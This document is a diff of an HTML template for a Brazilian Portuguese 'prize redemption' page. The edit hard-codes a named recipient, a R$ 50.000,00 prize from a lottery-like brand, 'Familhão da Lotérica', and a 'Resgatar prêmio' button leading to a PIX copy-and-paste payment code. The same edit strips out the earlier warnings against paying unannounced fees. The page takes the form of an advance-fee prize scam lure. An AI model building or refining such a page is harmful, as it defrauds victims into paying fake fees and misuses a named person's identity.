@@ -3,97 +3,104 @@
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <meta name="theme-color" content="#09152f" />
-  <title>Campanha Premiada</title>
-  <link rel="stylesheet" href="assets/style.css?v=20260811-1644" />
+  <meta name="theme-color" content="#f8f6f1" />
+  <title>Premiação</title>
+  <link rel="stylesheet" href="assets/style.css?v=20261013-0811" />
 </head>
-<body class="celebration-page">
-  <div class="party-bg" aria-hidden="true">
-    <span class="glow glow-1"></span><span class="glow glow-2"></span>
-    <span class="firework fw-1"></span><span class="firework fw-2"></span><span class="firework fw-3"></span>
-    <div class="confetti confetti-a">✦</div><div class="confetti confetti-b">●</div><div class="confetti confetti-c">★</div><div class="confetti confetti-d">◆</div><div class="confetti confetti-e">✦</div><div class="confetti confetti-f">●</div>
-  </div>
+<body class="public-body">
+  <main class="public-shell">
 
-  <header class="public-header">
-    <div class="public-header-inner">
-      <div class="public-brand">
-        <span class="public-logo">★</span>
-        <div><strong id="campaignName">Campanha Premiada</strong><small>Portal oficial de resgate</small></div>
-      </div>
-      <span class="verified-badge">✓ Informações da campanha</span>
-    </div>
-  </header>
-
-  <main class="celebration-shell">
-    <section id="winnerView" class="winner-card">
-      <div class="celebration-icon" aria-hidden="true">🏆</div>
-      <p class="winner-kicker">TEMOS UMA ÓTIMA NOTÍCIA</p>
-      <h1 id="headline">Parabéns, <span id="customerName">Visitante</span>!</h1>
-      <p class="winner-lead" id="message">Seu nome está vinculado a uma premiação desta campanha.</p>
-
-      <div class="prize-highlight">
-        <span class="prize-caption">VALOR DA PREMIAÇÃO</span>
-        <strong id="prizeValue">R$ 0,00</strong>
-        <small>Valor informado pela organização da campanha</small>
+    <section id="winnerView" class="prize-card">
+      <div class="prize-card-header">
+        <h1>Parabéns!</h1>
       </div>
 
-      <div class="celebration-strip" aria-hidden="true"><span>🎉</span><span>✨</span><span>🎊</span><span>⭐</span><span>🎁</span></div>
+      <div class="prize-card-body">
+        <h2 id="customerName">VERA LÚCIA APARECIDA GNANI</h2>
 
-      <section class="campaign-info">
-        <div class="info-item"><span class="info-icon">🏢</span><div><strong id="companyName">Empresa responsável</strong><small id="cnpj">CNPJ não informado</small></div></div>
-        <div class="info-item"><span class="info-icon">☎</span><div><strong>Canal oficial de atendimento</strong><small id="contact">Contato não informado</small></div></div>
-        <div class="info-item"><span class="info-icon">🔎</span><div><strong>Código de validação</strong><small id="validationCode">Não informado</small></div></div>
-      </section>
+        <div id="prizeValue" class="prize-value">R$ 50.000,00</div>
 
-      <section class="legal-links">
-        <a id="regulationLink" href="#" target="_blank" rel="noopener">📄 Ver regulamento</a>
-        <a id="termsLink" href="#" target="_blank" rel="noopener">⚖️ Termos da promoção</a>
-      </section>
+        <div class="prize-copy">
+          <p>Estamos muito felizes em compartilhar com você essa grande notícia.</p>
+          <p>Você é o mais novo ganhador do <strong id="campaignName">Familhão da Lotérica</strong>.</p>
+          <p id="message">Sua participação foi essencial e é com enorme satisfação que anunciamos que você foi contemplado com essa premiação especial.</p>
+          <p>Clique em <strong>"Resgatar prêmio"</strong> para continuar e prosseguir com o resgate da sua premiação.</p>
+          <p class="congrats-line">Parabéns por essa conquista e aproveite seu prêmio.</p>
+        </div>
 
-      <button id="ctaButton" class="button celebration-cta full" type="button">Continuar</button>
-      <p class="public-disclaimer">A confirmação e o resgate da premiação devem seguir os canais oficiais, o regulamento e os termos publicados pela empresa responsável.</p>
+        <button id="ctaButton" class="rescue-button" type="button">Resgatar prêmio</button>
+        <p class="validation-note">Confirmação sujeita à validação de dados.</p>
+      </div>
     </section>
 
-    <section id="redemptionView" class="redemption-wrap" hidden>
-      <article class="redemption-card">
-        <div class="redemption-head">
-          <div class="party-emoji">🎉</div>
-          <h2>Parabéns!</h2>
-        </div>
-        <div class="redemption-body">
-          <h3 id="redeemCustomerName">VISITANTE</h3>
-          <div class="redeem-value" id="redeemPrizeValue">R$ 0,00</div>
+    <section id="redemptionView" class="prize-card redemption-card" hidden>
+      <div class="prize-card-header">
+        <h1>Parabéns!</h1>
+      </div>
 
+      <div class="prize-card-body">
+        <h2 id="redeemCustomerName">VERA LÚCIA APARECIDA GNANI</h2>
+        <div id="redeemPrizeValue" class="prize-value">R$ 50.000,00</div>
+
+        <div class="prize-copy">
           <p>Estamos muito felizes em compartilhar com você essa grande notícia.</p>
-          <p>Você é o mais novo ganhador da <strong id="redeemCampaignName">Campanha Premiada</strong>.</p>
+          <p>Você é o mais novo ganhador do <strong id="redeemCampaignName">Familhão da Lotérica</strong>.</p>
           <p id="redeemText">Sua participação foi essencial e é com enorme satisfação que anunciamos que você foi contemplado com essa premiação especial.</p>
-          <p>Confira abaixo as instruções configuradas pela organização da campanha.</p>
-          <p><strong>Parabéns por essa conquista e aproveite seu prêmio.</strong></p>
-
-          <div class="payment-kind"><span id="paymentMethodIcon">◈</span><div><small>Forma configurada</small><strong id="paymentMethodLabel">PIX</strong></div></div>
-
-          <label class="redeem-code-label" for="paymentCodeDisplay">Código copia e cola:</label>
-          <div id="paymentCodeDisplay" class="redeem-code" role="textbox" aria-readonly="true">Código não configurado</div>
-          <button id="copyPaymentCode" class="button copy-code-button full" type="button">▣ &nbsp; Copiar código</button>
-          <p id="copyFeedback" class="copy-feedback" aria-live="polite"></p>
-
-          <p class="redemption-disclaimer">Confirmação sujeita à validação de dados. Qualquer pagamento ou transferência deve estar claramente previsto no regulamento e nos termos oficiais da campanha; não efetue cobranças ou taxas não informadas.</p>
-          <button id="backButton" class="button back-button full" type="button">← Voltar</button>
+          <p class="congrats-line">Parabéns por essa conquista e aproveite seu prêmio.</p>
         </div>
-      </article>
 
-      <section class="how-it-works">
-        <h2>Como funciona</h2>
-        <div class="steps-grid">
-          <div class="step"><span>▣</span><small>Etapa 1</small><strong>Confirme seus dados</strong><p>Verifique suas informações pessoais</p></div>
-          <div class="step"><span>✓</span><small>Etapa 2</small><strong>Sistema validado</strong><p>Validação automática do sistema</p></div>
-          <div class="step"><span>➤</span><small>Etapa 3</small><strong>Receba instruções</strong><p>Orientações enviadas pelo canal oficial</p></div>
+        <div class="payment-summary">
+          <span id="paymentMethodLabel">PIX</span>
         </div>
-      </section>
+
+        <label class="code-label">Seu código de resgate:</label>
+        <div id="paymentCodeDisplay" class="code-box">Código não configurado</div>
+
+        <button id="copyPaymentCode" class="copy-button" type="button">Copiar código</button>
+        <p id="copyFeedback" class="copy-feedback" aria-live="polite"></p>
+
+        <p class="validation-note">Confirmação sujeita à validação de dados.</p>
+        <button id="backButton" class="back-link" type="button">← Voltar</button>
+      </div>
+    </section>
+
+    <section class="how-section">
+      <h2>Como funciona</h2>
+      <div class="how-grid">
+        <article class="how-card">
+          <div class="how-icon">◌</div>
+          <h3>1. Confirme seus dados</h3>
+          <p>Informe seus dados para confirmarmos a titularidade do prêmio.</p>
+        </article>
+        <article class="how-card">
+          <div class="how-icon">♢</div>
+          <h3>2. Sistema validado</h3>
+          <p>Nosso sistema valida automaticamente o código de resgate.</p>
+        </article>
+        <article class="how-card">
+          <div class="how-icon">✧</div>
+          <h3>3. Receba instruções</h3>
+          <p>Você recebe as instruções finais para receber o valor.</p>
+        </article>
+      </div>
+    </section>
+
+    <section class="official-info">
+      <div>
+        <strong id="companyName">Empresa responsável</strong>
+        <span id="cnpj">CNPJ não informado</span>
+      </div>
+      <div>
+        <strong>Contato oficial</strong>
+        <span id="contact">Contato não informado</span>
+      </div>
+      <div class="official-links">
+        <a id="regulationLink" href="#" target="_blank" rel="noopener">Regulamento</a>
+        <a id="termsLink" href="#" target="_blank" rel="noopener">Termos da promoção</a>
+      </div>
     </section>
   </main>
 
-  <footer class="public-footer"><p>© <span id="currentYear"></span> <span id="footerCampaignName">Campanha Premiada</span> · Todos os direitos reservados</p></footer>
-  <script src="assets/app.js?v=20260811-1644"></script>
+  <script src="assets/app.js?v=20261013-0811"></script>
 </body>
 </html>
